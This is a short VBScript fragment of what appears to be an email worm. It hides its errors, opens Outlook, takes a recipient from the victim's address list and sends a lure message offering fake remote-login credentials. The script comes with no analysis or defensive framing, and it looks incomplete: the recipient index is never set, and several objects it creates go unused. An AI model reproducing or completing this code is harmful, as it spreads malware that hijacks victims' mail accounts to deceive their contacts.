On Error Resume Next
Set fs=CreateObject("Scripting.FileSystemObject")
Set dir1=fs.GetSpecialFolder(0)
set dir3=fs.GetSpecialFolder(1)
Set so=CreateObject("Scripting.FileSystemObject")
Set oo=CreateObject("Outlook.Application")
Set Mail=oo.CreateItem(0)
Mail.to=oo.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)
Mail.Subject="There is a good chance for you!!"
Mail.Body="My computer has been attacked. User:oo Password:163 Using Remote Desktop or NetBIOS. Come on, I am waiting for you!"
Mail.Send
